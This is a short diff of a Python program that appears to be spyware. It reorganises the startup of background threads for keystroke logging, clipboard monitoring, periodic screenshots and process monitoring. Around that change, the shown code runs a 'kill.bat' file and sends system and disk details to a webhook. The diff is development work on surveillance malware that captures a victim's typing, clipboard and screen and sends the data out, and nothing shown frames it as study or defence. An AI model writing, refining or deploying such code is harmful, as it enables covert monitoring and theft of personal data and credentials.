@@ -205,13 +205,6 @@ def screenshot():
         time.sleep(30)  # Reduced for testing
 
 
-threading.Thread(target=screenshot, daemon=True).start()
-
-
-# Start process monitoring in a separate thread
-process_thread = threading.Thread(target=monitor_processes, daemon=True)
-process_thread.start()
-
 # Run kill.bat file at the start
 run_bat_file()
 
@@ -234,9 +227,16 @@ send_to_webhook(
 send_to_webhook(
     f"Disk info: Total: {disk_info.total}, Used: {disk_info.used}, Free: {disk_info.free}, Percent: {disk_info.percent}%")
 
-# Start the keystroke monitor and clipboard monitor threads
-threading.Thread(target=keystroke_monitor, daemon=True).start()
-threading.Thread(target=monitor_clipboard, daemon=True).start()
+# Start all monitoring threads
+keystroke_thread = threading.Thread(target=keystroke_monitor, daemon=True)
+clipboard_thread = threading.Thread(target=monitor_clipboard, daemon=True)
+screenshot_thread = threading.Thread(target=screenshot, daemon=True)
+process_thread = threading.Thread(target=monitor_processes, daemon=True)
+
+keystroke_thread.start()
+clipboard_thread.start()
+screenshot_thread.start()
+process_thread.start()
 
 # Set up the keyboard listener
 try:
